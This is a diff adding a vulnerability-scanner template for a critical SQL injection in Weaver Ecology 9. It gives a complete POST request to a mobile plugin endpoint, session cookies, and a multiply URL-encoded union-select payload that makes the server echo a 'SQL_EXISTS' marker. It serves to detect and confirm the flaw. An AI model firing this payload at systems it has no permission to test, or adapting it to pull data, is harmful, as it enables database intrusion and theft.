@@ -1,0 +1,24 @@
+id: ecology-v9-sqli
+
+info:
+  name: Ecology 9 - SQL Injection
+  author: ritikchaddha
+  severity: critical
+  verified: true
+  description: |
+    Ecology 9 contains a SQL injection vulnerability via a POST request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+    app="泛微-协同商务系统"
+  reference:
+    - https://mp.weixin.qq.com/s/9-XdgDkZObvQpmujOiC5Ug
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mobile/%20/plugin/browser.jsp
+      headers:
+        Cookie: ecology_JSessionid=aaaDJa14QSGzJhpHl4Vsy; JSESSIONID=aaaDJa14QSGzJhpHl4Vsy; __randcode__=28dec942-50d2-486e-8661-3e613f71028a
+      body: |
+        isDis=1&browserTypeId=269&keyword=%25%32%35%25%33%36%25%33%31%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%35%25%32%35%25%33%36%25%36%35%25%32%35%25%33%36%25%33%39%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35%25%32%35%25%33%32%25%33%30%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%33%25%33%31%25%32%35%25%33%32%25%36%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%38%25%32%35%25%33%37%25%33%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%36%33%25%32%35%25%33%36%25%33%35%25%32%35%25%33%36%25%33%33%25%32%35%25%33%37%25%33%34%25%32%35%25%33%32%25%33%30%25%32%35%25%33%32%25%33%37%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%31%25%32%35%25%33%34%25%36%33%25%32%35%25%33%35%25%36%36%25%32%35%25%33%34%25%33%35%25%32%35%25%33%35%25%33%38%25%32%35%25%33%34%25%33%39%25%32%35%25%33%35%25%33%33%25%32%35%25%33%35%25%33%34%25%32%35%25%33%35%25%33%33%25%32%35%25%33%32%25%33%37%25%32%35%25%33%32%25%33%39%25%32%35%25%33%32%25%36%32%25%32%35%25%33%32%25%33%37
+    expression: response.status == 200 && response.body.bcontains(b'"SQL_EXISTS')
+expression: r0()
